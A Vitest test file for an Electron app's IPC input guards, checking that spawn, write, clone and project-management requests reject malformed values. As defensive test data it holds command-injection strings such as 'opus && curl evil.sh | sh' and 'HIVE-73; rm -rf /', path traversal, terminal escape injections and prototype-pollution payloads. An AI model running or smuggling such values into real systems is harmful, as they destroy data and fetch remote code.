// @vitest-environment node
import { describe, expect, it } from 'vitest';

import { CLONE_ENTITY_ID } from '../../../electron/shared/config-contract';

import {
  IpcValidationError,
  parseAddProjectRequest,
  parseCloneRequest,
  parseKillRequest,
  parseRemoveProjectRequest,
  parseRenameProjectRequest,
  parseReorderProjectsRequest,
  parseRepointProjectRequest,
  parseResizeRequest,
  parseSpawnRequest,
  parseWriteRequest,
} from '../../../electron/shared/guards';

const validSpawn = { sessionId: 'sess-1', projectId: 'proj-1', cols: 80, rows: 24 };

/**
 * The guard matrix story 082 specifies: wrong type, missing field, extra field,
 * prototype-polluting key, and a non-string sessionId — for every payload.
 */
describe('parseSpawnRequest', () => {
  it('accepts a well-formed request and returns a typed value', () => {
    expect(parseSpawnRequest({ ...validSpawn })).toEqual(validSpawn);
  });

  it('does not pass through anything beyond the declared fields', () => {
    const parsed = parseSpawnRequest({ ...validSpawn });
    expect(Object.keys(parsed).sort()).toEqual([
      'cols',
      'projectId',
      'rows',
      'sessionId',
    ]);
  });

  describe('name (HIVE-78)', () => {
    it('accepts an issue key and its de-duplicating suffix', () => {
      // The only two shapes the store constructs: `HIVE-73`, then `HIVE-73-2`
      // when a second session is opened for the same ticket.
      expect(parseSpawnRequest({ ...validSpawn, name: 'HIVE-73' })).toEqual({
        ...validSpawn,
        name: 'HIVE-73',
      });
      expect(parseSpawnRequest({ ...validSpawn, name: 'HIVE-73-2' })).toEqual({
        ...validSpawn,
        name: 'HIVE-73-2',
      });
    });

    it('omits the key entirely when it was not sent', () => {
      // Absent means main names the session after its entity id, which is
      // every spawn that did not come from a ticket card.
      expect(parseSpawnRequest({ ...validSpawn })).not.toHaveProperty('name');
    });

    it.each([
      ['a space', 'HIVE 73'],
      ['a quote', "HIVE-'73"],
      ['a backtick', 'HIVE-`73`'],
      ['a dollar', 'HIVE-$73'],
      ['a semicolon', 'HIVE-73; rm -rf /'],
      ['a pipe', 'HIVE-73 | sh'],
      ['an ampersand', 'HIVE-73 && curl evil.sh'],
      ['a newline', 'HIVE-73\nrm -rf /'],
      ['a leading hyphen, which would read as a flag', '--help'],
      ['an empty string', ''],
      ['a non-string', 42],
    ])('rejects %s', (_label, name) => {
      /**
       * Unlike `model` and `effort` this has no closed list behind it, so the
       * pattern *is* the defence — the value is interpolated into a command
       * line a login shell parses.
       *
       * Rejected here rather than dropped, which is what `bootstrap.ts` does
       * with the same value. Not a contradiction: main's own spawn path reaches
       * `bootstrap.ts` with no guard in between and needs a lenient fallback,
       * whereas a *renderer* sending an unsendable name built it wrongly and
       * should hear about it.
       */
      expect(() => parseSpawnRequest({ ...validSpawn, name })).toThrow(
        IpcValidationError,
      );
    });

    it('rejects a name past the sendable maximum', () => {
      expect(() =>
        parseSpawnRequest({ ...validSpawn, name: `A${'b'.repeat(64)}` }),
      ).toThrow(IpcValidationError);
    });
  });

  describe('model and effort (story 109)', () => {
    it('accepts a member of each closed set', () => {
      expect(
        parseSpawnRequest({ ...validSpawn, model: 'haiku', effort: 'low' }),
      ).toEqual({ ...validSpawn, model: 'haiku', effort: 'low' });
    });

    it('omits the key entirely when it was not sent', () => {
      // An own property set to `undefined` is still a key after a structured
      // clone, and would become `--model undefined` on a command line.
      const parsed = parseSpawnRequest({ ...validSpawn });
      expect(parsed).not.toHaveProperty('model');
      expect(parsed).not.toHaveProperty('effort');
    });

    it.each([
      ['an unknown model', { model: 'gpt-4' }],
      ['a model differing only in case', { model: 'Opus' }],
      ['an unknown effort', { effort: 'xhigh' }],
      ['a non-string', { model: 42 }],
      ['an empty string', { effort: '' }],
    ])('rejects %s', (_label, patch) => {
      expect(() => parseSpawnRequest({ ...validSpawn, ...patch })).toThrow(
        IpcValidationError,
      );
    });

    it('rejects anything a shell could interpret', () => {
      /**
       * **The reason this field is an enum and not bounded free text.**
       *
       * These two values are the only thing the renderer contributes to a
       * command line main assembles and writes into a login shell. `assertText`
       * would pass every one of these — they are printable, short, and contain
       * no control characters — and each one would run something. Membership of
       * a fixed list is what makes the value unquotable rather than quoted.
       */
      for (const model of [
        'opus; rm -rf /',
        'opus && curl evil.sh | sh',
        'opus $(whoami)',
        'opus `id`',
        '--dangerously-skip-permissions',
      ]) {
        expect(() => parseSpawnRequest({ ...validSpawn, model })).toThrow(
          /expected one of/,
        );
      }
    });

    it('names the permitted values, for whoever added one to only one side', () => {
      expect(() =>
        parseSpawnRequest({ ...validSpawn, model: 'nope' }),
      ).toThrow(/spawn\.model: expected one of haiku, sonnet, opus, fable/);
    });
  });

  it.each([
    ['not an object', 'sess-1'],
    ['null', null],
    ['an array', []],
    ['undefined', undefined],
  ])('rejects %s', (_label, input) => {
    expect(() => parseSpawnRequest(input)).toThrow(IpcValidationError);
  });

  it('rejects a missing field', () => {
    const { cols: _cols, ...missing } = validSpawn;
    expect(() => parseSpawnRequest(missing)).toThrow(/missing key "cols"/);
  });

  it('rejects an extra field rather than ignoring it', () => {
    // An unexpected key means the two sides disagree about the contract.
    expect(() => parseSpawnRequest({ ...validSpawn, cwd: '/etc' })).toThrow(
      /unexpected key "cwd"/,
    );
  });

  it('rejects a prototype-polluting key', () => {
    // JSON.parse produces an OWN property named __proto__, which a spread
    // would carry into the next object.
    const polluted = JSON.parse(
      '{"sessionId":"s","projectId":"p","cols":80,"rows":24,"__proto__":{"admin":true}}',
    );
    expect(() => parseSpawnRequest(polluted)).toThrow(/forbidden key/);
  });

  it('rejects a non-string sessionId', () => {
    expect(() => parseSpawnRequest({ ...validSpawn, sessionId: 42 })).toThrow(
      /expected a string/,
    );
  });

  it.each([
    ['empty', ''],
    ['a path traversal', '../../etc/passwd'],
    ['a newline (log injection)', 'sess\n1'],
    ['a null byte', 'sess\u00001'],
    ['a shell metacharacter', 'sess;rm -rf /'],
    ['over 128 chars', 'a'.repeat(129)],
  ])('rejects a sessionId that is %s', (_label, id) => {
    expect(() => parseSpawnRequest({ ...validSpawn, sessionId: id })).toThrow(
      IpcValidationError,
    );
  });

  it.each([
    ['zero', 0],
    ['negative', -1],
    ['fractional', 80.5],
    ['absurd', 100_000],
    ['NaN', Number.NaN],
    ['a string', '80'],
  ])('rejects cols that is %s', (_label, cols) => {
    expect(() => parseSpawnRequest({ ...validSpawn, cols })).toThrow(
      IpcValidationError,
    );
  });
});

describe('parseSpawnRequest — the optional task', () => {
  it('accepts a request with no task at all', () => {
    expect(parseSpawnRequest({ ...validSpawn })).not.toHaveProperty('task');
  });

  it('accepts an ordinary task', () => {
    expect(
      parseSpawnRequest({ ...validSpawn, task: 'fix the hero' }).task,
    ).toBe('fix the hero');
  });

  it('accepts punctuation and non-ASCII text', () => {
    const task = 'rename “widget” → gadget (see #219)';
    expect(parseSpawnRequest({ ...validSpawn, task }).task).toBe(task);
  });

  /**
   * The task is written into a pty, so a control character is not a
   * formatting quirk — it is an instruction to a terminal the user trusts.
   */
  it('rejects a carriage return, which would submit a line nobody typed', () => {
    expect(() =>
      parseSpawnRequest({ ...validSpawn, task: 'ls\rrm -rf /' }),
    ).toThrow(/control characters/);
  });

  it('rejects an escape byte, which could address the cursor', () => {
    expect(() =>
      parseSpawnRequest({ ...validSpawn, task: 'a\u001b[31mb' }),
    ).toThrow(/control characters/);
  });

  it('rejects a NUL', () => {
    expect(() =>
      parseSpawnRequest({ ...validSpawn, task: 'a\u0000b' }),
    ).toThrow(IpcValidationError);
  });

  it('rejects an unbounded task', () => {
    expect(() =>
      parseSpawnRequest({ ...validSpawn, task: 'x'.repeat(4097) }),
    ).toThrow(/too long/);
  });

  it('rejects an empty task rather than spawning a blank instruction', () => {
    expect(() => parseSpawnRequest({ ...validSpawn, task: '' })).toThrow(
      /must not be empty/,
    );
  });

  it('rejects a non-string task', () => {
    expect(() => parseSpawnRequest({ ...validSpawn, task: 42 })).toThrow(
      IpcValidationError,
    );
  });

  it('still rejects an unexpected key — optional is not a free-for-all', () => {
    expect(() => parseSpawnRequest({ ...validSpawn, nope: 1 })).toThrow(
      /unexpected key/,
    );
  });

  it('still rejects a missing required key', () => {
    const { cols: _cols, ...missing } = validSpawn;
    expect(() => parseSpawnRequest({ ...missing, task: 'x' })).toThrow(
      /missing key "cols"/,
    );
  });
});

describe('parseWriteRequest', () => {
  it('accepts keystrokes', () => {
    expect(parseWriteRequest({ sessionId: 'sess-1', data: 'ls -la\r' })).toEqual({
      sessionId: 'sess-1',
      data: 'ls -la\r',
    });
  });

  it('allows control characters in data — they are keystrokes, not content', () => {
    // Ctrl-C. Never interpreted here; only written to a pty's stdin.
    const parsed = parseWriteRequest({ sessionId: 'sess-1', data: '\u0003' });
    expect(parsed.data).toBe('\u0003');
  });

  it('rejects a missing field, an extra field, and a bad id', () => {
    expect(() => parseWriteRequest({ sessionId: 'sess-1' })).toThrow(/missing key/);
    expect(() =>
      parseWriteRequest({ sessionId: 'sess-1', data: 'x', echo: true }),
    ).toThrow(/unexpected key/);
    expect(() => parseWriteRequest({ sessionId: 12, data: 'x' })).toThrow(
      /expected a string/,
    );
  });

  it('rejects non-string data', () => {
    expect(() =>
      parseWriteRequest({ sessionId: 'sess-1', data: { toString: 'evil' } }),
    ).toThrow(/expected a string/);
  });
});

describe('parseResizeRequest', () => {
  it('accepts geometry', () => {
    expect(parseResizeRequest({ sessionId: 's1', cols: 120, rows: 40 })).toEqual({
      sessionId: 's1',
      cols: 120,
      rows: 40,
    });
  });

  it('rejects the whole matrix', () => {
    expect(() => parseResizeRequest(null)).toThrow(IpcValidationError);
    expect(() => parseResizeRequest({ sessionId: 's1', cols: 80 })).toThrow(
      /missing key "rows"/,
    );
    expect(() =>
      parseResizeRequest({ sessionId: 's1', cols: 80, rows: 24, pixel: 1 }),
    ).toThrow(/unexpected key/);
    expect(() => parseResizeRequest({ sessionId: [], cols: 80, rows: 24 })).toThrow(
      /expected a string/,
    );
  });
});

describe('parseKillRequest', () => {
  it('accepts a bare session id', () => {
    expect(parseKillRequest('sess-1')).toBe('sess-1');
  });

  it('rejects a non-string, an empty string, and a malformed id', () => {
    expect(() => parseKillRequest(42)).toThrow(/expected a string/);
    expect(() => parseKillRequest('')).toThrow(/malformed id/);
    expect(() => parseKillRequest('../other')).toThrow(/malformed id/);
  });

  it('rejects an object masquerading as an id', () => {
    expect(() => parseKillRequest({ toString: () => 'sess-1' })).toThrow(
      /expected a string/,
    );
  });
});

describe('parseAddProjectRequest', () => {
  it('accepts a path alone and a path with a name', () => {
    expect(parseAddProjectRequest({ path: '/tmp/x' })).toEqual({ path: '/tmp/x' });
    expect(parseAddProjectRequest({ path: '/tmp/x', name: 'X' })).toEqual({
      path: '/tmp/x',
      name: 'X',
    });
  });

  it('does not create an own name key when none was sent', () => {
    // An `undefined`-valued own key would be written to the config file and
    // reported as unknown the next time it is read.
    expect(Object.keys(parseAddProjectRequest({ path: '/tmp/x' }))).toEqual(['path']);
  });

  it('rejects __proto__', () => {
    expect(() =>
      parseAddProjectRequest(JSON.parse('{"path":"/tmp/x","__proto__":{}}')),
    ).toThrow(/forbidden key/);
  });

  it('rejects a non-string path, a missing path, and an unexpected key', () => {
    expect(() => parseAddProjectRequest({ path: 7 })).toThrow(/expected a string/);
    expect(() => parseAddProjectRequest({})).toThrow(/missing key "path"/);
    expect(() => parseAddProjectRequest({ path: '/x', nope: 1 })).toThrow(
      /unexpected key/,
    );
  });

  it('rejects an empty or whitespace-only path', () => {
    expect(() => parseAddProjectRequest({ path: '' })).toThrow(/non-empty/);
    expect(() => parseAddProjectRequest({ path: '   ' })).toThrow(/non-empty/);
  });

  it('rejects an empty name', () => {
    expect(() => parseAddProjectRequest({ path: '/x', name: '' })).toThrow(
      /must not be empty/,
    );
  });

  /**
   * `name` is a display string, so it takes the bounded, control-character-free
   * guard rather than the deliberately permissive path one. A renderer that
   * skipped the dialog could otherwise persist an unbounded name into the
   * config, and control characters would reach a file the user hand-edits.
   */
  it('bounds the name and rejects control characters in it', () => {
    expect(() =>
      parseAddProjectRequest({ path: '/x', name: 'a'.repeat(4097) }),
    ).toThrow(/too long/);
    expect(() =>
      parseAddProjectRequest({ path: '/x', name: 'evil\u001b[2Jname' }),
    ).toThrow(/control characters/);
  });

  it('still accepts an unbounded path, which is about to be realpath-ed', () => {
    const deep = `/${'nested/'.repeat(700)}repo`;
    expect(parseAddProjectRequest({ path: deep }).path).toBe(deep);
  });
});

describe('parseRemoveProjectRequest', () => {
  it('accepts an id', () => {
    expect(parseRemoveProjectRequest({ id: 'the-hive' })).toEqual({ id: 'the-hive' });
  });

  it('rejects a malformed id, a missing id, and __proto__', () => {
    expect(() => parseRemoveProjectRequest({ id: '../etc' })).toThrow(/malformed id/);
    expect(() => parseRemoveProjectRequest({})).toThrow(/missing key "id"/);
    expect(() =>
      parseRemoveProjectRequest(JSON.parse('{"id":"a","__proto__":{}}')),
    ).toThrow(/forbidden key/);
  });
});

describe('parseCloneRequest', () => {
  const validClone = {
    url: 'https://github.com/behiques/the-hive.git',
    parentPath: '/Users/me/Projects',
    cols: 80,
    rows: 24,
  };

  it('accepts a well-formed request', () => {
    expect(parseCloneRequest(validClone)).toEqual(validClone);
  });

  it('rejects a missing key', () => {
    const { url: _url, ...rest } = validClone;
    expect(() => parseCloneRequest(rest)).toThrow(IpcValidationError);
  });

  /**
   * The key that matters most: a renderer naming where the clone should land
   * is refused before main sees it, which is what keeps the epic's "no verb
   * takes a destination path" rule true for this story.
   */
  it('rejects a destination key', () => {
    expect(() =>
      parseCloneRequest({ ...validClone, destination: '/etc' }),
    ).toThrow(IpcValidationError);
  });

  it('rejects __proto__', () => {
    const payload = JSON.parse(
      '{"url":"https://x/y.git","parentPath":"/p","cols":80,"rows":24,"__proto__":{"admin":true}}',
    ) as unknown;
    expect(() => parseCloneRequest(payload)).toThrow(IpcValidationError);
  });

  it('rejects a non-string url', () => {
    expect(() => parseCloneRequest({ ...validClone, url: 42 })).toThrow(
      IpcValidationError,
    );
  });

  it('rejects an empty parentPath', () => {
    expect(() => parseCloneRequest({ ...validClone, parentPath: '  ' })).toThrow(
      IpcValidationError,
    );
  });

  it('rejects a non-integer cols', () => {
    expect(() => parseCloneRequest({ ...validClone, cols: 1.5 })).toThrow(
      IpcValidationError,
    );
  });

  it('rejects a zero rows', () => {
    expect(() => parseCloneRequest({ ...validClone, rows: 0 })).toThrow(
      IpcValidationError,
    );
  });
});

/**
 * The clone entity id has to survive the id guard (story 102).
 *
 * It travels on `pty:write` as `sessionId`, and `pty:write` is a `send`
 * channel — a rejected payload is logged and dropped, never returned. So an id
 * this guard refuses does not fail loudly: every keystroke vanishes, the
 * terminal keeps blinking its cursor, and no credential prompt can ever be
 * answered. That is the whole reason the story runs `git` in a PTY, so it is
 * worth a test of its own rather than trust in a constant.
 */
describe('CLONE_ENTITY_ID', () => {
  it('is accepted wherever a session id is validated', () => {
    expect(parseKillRequest(CLONE_ENTITY_ID)).toBe(CLONE_ENTITY_ID);
    expect(
      parseWriteRequest({ sessionId: CLONE_ENTITY_ID, data: 'hunter2\r' }),
    ).toEqual({ sessionId: CLONE_ENTITY_ID, data: 'hunter2\r' });
    expect(
      parseResizeRequest({ sessionId: CLONE_ENTITY_ID, cols: 80, rows: 24 }),
    ).toMatchObject({ sessionId: CLONE_ENTITY_ID });
  });

  /** A colon is the specific character that broke this in development. */
  it('contains no character the id guard rejects', () => {
    expect(CLONE_ENTITY_ID).not.toContain(':');
    expect(CLONE_ENTITY_ID).toMatch(/^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$/);
  });

  /**
   * `deriveProjectId` kebabs a basename to `[a-z0-9-]`, so a dot is a character
   * it can never emit — which is what makes a collision impossible.
   */
  it('cannot be produced by project-id derivation', () => {
    expect(CLONE_ENTITY_ID).toContain('.');
  });
});

/**
 * Story 103's three mutating payloads.
 *
 * Same matrix as story 101's: wrong type, missing field, extra field, and a
 * prototype-polluting key. The additions specific to this story are the ones
 * about *display* text — a name is rendered rather than resolved, so it is
 * bounded and control-character free where a path deliberately is not.
 */
describe('parseRenameProjectRequest', () => {
  it('accepts an id and a display name', () => {
    expect(parseRenameProjectRequest({ id: 'the-hive', name: 'The Hive' })).toEqual({
      id: 'the-hive',
      name: 'The Hive',
    });
  });

  it('trims the name, so a padded one cannot masquerade as different', () => {
    expect(parseRenameProjectRequest({ id: 'a', name: '  The Hive  ' })).toEqual({
      id: 'a',
      name: 'The Hive',
    });
  });

  it('rejects an empty or whitespace-only name', () => {
    expect(() => parseRenameProjectRequest({ id: 'a', name: '' })).toThrow(
      /must not be empty/,
    );
    expect(() => parseRenameProjectRequest({ id: 'a', name: '   ' })).toThrow(
      /must not be empty/,
    );
  });

  it('rejects control characters and over-long names', () => {
    expect(() => parseRenameProjectRequest({ id: 'a', name: 'x\ny' })).toThrow(
      /control characters/,
    );
    expect(() =>
      parseRenameProjectRequest({ id: 'a', name: 'x'.repeat(4097) }),
    ).toThrow(/too long/);
  });

  it('rejects unknown keys, __proto__ and a missing field', () => {
    expect(() =>
      parseRenameProjectRequest({ id: 'a', name: 'b', extra: 1 }),
    ).toThrow(/unexpected key/);
    expect(() =>
      parseRenameProjectRequest(JSON.parse('{"id":"a","name":"b","__proto__":{}}')),
    ).toThrow(/forbidden key/);
    expect(() => parseRenameProjectRequest({ id: 'a' })).toThrow(/missing key/);
  });

  it('rejects a non-string name and a malformed id', () => {
    expect(() => parseRenameProjectRequest({ id: 'a', name: 7 })).toThrow(
      IpcValidationError,
    );
    expect(() => parseRenameProjectRequest({ id: 'a b', name: 'c' })).toThrow(
      /renameProject.id/,
    );
  });
});

describe('parseRepointProjectRequest', () => {
  it('accepts an id and a path, keeping the path verbatim', () => {
    expect(
      parseRepointProjectRequest({ id: 'the-hive', path: '~/Projects/hive' }),
    ).toEqual({ id: 'the-hive', path: '~/Projects/hive' });
  });

  it('rejects an empty path and an unknown key', () => {
    expect(() => parseRepointProjectRequest({ id: 'a', path: '  ' })).toThrow(
      /expected a non-empty string/,
    );
    expect(() =>
      parseRepointProjectRequest({ id: 'a', path: '/x', to: '/y' }),
    ).toThrow(/unexpected key/);
  });

  it('rejects __proto__ and a missing field', () => {
    expect(() =>
      parseRepointProjectRequest(JSON.parse('{"id":"a","path":"/x","__proto__":{}}')),
    ).toThrow(/forbidden key/);
    expect(() => parseRepointProjectRequest({ id: 'a' })).toThrow(/missing key/);
  });

  /**
   * A path is about to be `realpath`'d, so it gets the permissive guard — the
   * same call `parseAddProjectRequest` makes. Main is the gate, not this.
   */
  it('does not bound the path the way it bounds a display name', () => {
    const long = `/${'x'.repeat(5000)}`;
    expect(parseRepointProjectRequest({ id: 'a', path: long }).path).toBe(long);
  });
});

describe('parseReorderProjectsRequest', () => {
  it('accepts an array of ids and returns them in order', () => {
    expect(parseReorderProjectsRequest({ ids: ['a', 'b', 'c'] })).toEqual({
      ids: ['a', 'b', 'c'],
    });
  });

  it('accepts an empty list', () => {
    expect(parseReorderProjectsRequest({ ids: [] })).toEqual({ ids: [] });
  });

  it('rejects a non-array', () => {
    expect(() => parseReorderProjectsRequest({ ids: 'a' })).toThrow(
      /expected an array/,
    );
  });

  it('names the offending index when an id is malformed', () => {
    expect(() => parseReorderProjectsRequest({ ids: ['a', 'a b'] })).toThrow(
      /reorderProjects\.ids\[1\]/,
    );
  });

  /**
   * A duplicate can never be a permutation of the file's ids, so rejecting it
   * here keeps the verb's own check a plain set comparison.
   */
  it('rejects a duplicate id', () => {
    expect(() => parseReorderProjectsRequest({ ids: ['a', 'a'] })).toThrow(
      /duplicate id/,
    );
  });

  /**
   * `.map`, `.every` and `Set` all skip array holes, so a sparse array could
   * satisfy every check and still return a value violating its own
   * `readonly string[]` type — putting a literal `null` into the config file.
   * A `contextBridge` clone densifies it today; main's only shape guard should
   * not rest on a renderer-side implementation detail.
   */
  it('rejects a sparse array rather than passing the hole through', () => {
    const sparse = ['a', 'b'];
    delete sparse[0];
    expect(() => parseReorderProjectsRequest({ ids: sparse })).toThrow(
      /reorderProjects\.ids\[0\]/,
    );
  });

  /** Bounded like every other guard here: the real value is bounded by disk. */
  it('rejects an absurdly long list', () => {
    const ids = Array.from({ length: 1001 }, (_unused, index) => `p${index}`);
    expect(() => parseReorderProjectsRequest({ ids })).toThrow(/too many ids/);
    expect(() =>
      parseReorderProjectsRequest({ ids: ids.slice(0, 1000) }),
    ).not.toThrow();
  });

  it('rejects unknown keys and __proto__', () => {
    expect(() => parseReorderProjectsRequest({ ids: [], extra: 1 })).toThrow(
      /unexpected key/,
    );
    expect(() =>
      parseReorderProjectsRequest(JSON.parse('{"ids":[],"__proto__":{}}')),
    ).toThrow(/forbidden key/);
  });
});
